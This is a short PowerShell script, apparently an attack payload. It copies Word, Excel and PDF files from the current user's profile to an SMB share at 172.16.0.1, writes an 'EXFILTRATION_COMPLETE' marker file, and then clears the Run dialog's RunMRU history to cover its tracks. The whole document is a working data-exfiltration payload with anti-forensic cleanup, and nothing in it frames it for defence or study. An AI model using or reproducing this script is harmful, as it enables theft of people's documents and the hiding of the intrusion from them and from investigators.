$exfil_dir="$Env:UserProfile"
$loot_dir="\\172.16.0.1\s\e\$((Get-Date).ToString('yyyy-MM-dd_hhmmtt'))"
mkdir $loot_dir
robocopy $exfil_dir $loot_dir *.doc *.docx *.xls *.xlsx *.pdf /S /MT /Z
New-Item -Path \\172.16.0.1\s -Name "EXFILTRATION_COMPLETE" -Value "EXFILTRATION_COMPLETE"
Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue
